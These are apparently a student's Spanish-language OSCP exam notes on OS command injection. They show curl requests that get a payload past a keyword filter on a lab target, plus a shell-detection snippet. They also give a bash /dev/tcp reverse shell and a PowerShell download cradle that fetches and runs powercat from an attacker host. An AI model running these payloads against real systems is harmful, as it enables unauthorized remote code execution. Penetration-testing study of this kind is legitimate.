---
tipo: tecnica
fase: explotacion
so: 
tags: [oscp, tecnica, explotacion, web]
fecha: 2026-09-28
---

# Command Injection

> [!abstract] Qué es y cuándo usarla
> **OS command injection**: la app pasa input del usuario a un comando del sistema sin sanear correctamente → inyectamos comandos propios. Sospechar en cualquier funcionalidad que "ejecute algo" (git clone, ping, nslookup, conversores, backups). Objetivo: **RCE / reverse shell**.

## Requisitos previos
- Un campo cuyo valor acabe en un comando del SO.
- curl/Burp para ver la estructura exacta de la request (HTTP history).

## Encadenar comandos
| Operador | Dónde | URL-encoded |
|---|---|---|
| `;` | Bash, PowerShell | `%3B` |
| `&&` | Bash, PowerShell, CMD | `%26%26` |
| `&` | CMD (Windows) | `%26` |
| `\|` (pipe) | todos | `%7C` |

## Flujo (caso "Archive" = git clone)
```bash
curl -X POST --data 'Archive=ipconfig' http://target:8000/archive   # "Command Injection detected"
curl -X POST --data 'Archive=git' http://target:8000/archive        # OK -> el filtro exige "git"
curl -X POST --data 'Archive=git version' http://target:8000/archive # "windows" en la salida -> SO
# encadenar manteniendo "git": %3B = ;
curl -X POST --data 'Archive=git%3Bipconfig' http://target:8000/archive
```
| Flag curl | Qué hace |
|---|---|
| `-X POST` | Fuerza método POST |
| `--data 'k=v'` | Cuerpo del POST |

## Detectar el intérprete (Windows: CMD vs PowerShell)
Snippet de PetSerAl (imprime `CMD` o `PowerShell`):
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

## Reverse shell
**Linux (bash):**
```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"   # URL-encode los caracteres especiales
```
**Windows (Powercat, incluido en Kali):**
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80        # servir powercat
nc -nvlp 4444                    # listener
```
Comando inyectado (download cradle + powercat), URL-encoded y prefijado con `git;`:
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```

> [!warning] Detección / problemas
> - Filtros pueden exigir/bloquear ciertas palabras (`git` obligatorio, `ipconfig` bloqueado) → backtrack desde el input que sí funciona.
> - Siempre **URL-encode** operadores y espacios (`%3B`, `%20`).
> - El vector depende del SO e intérprete: detecta primero dónde se ejecuta.

## Visto en
- Módulo: [[09 - Common Web Application Attacks]]
- Cheatsheet: [[Web]] · [[Explotacion y Shells]]
- Máquinas: [[]]
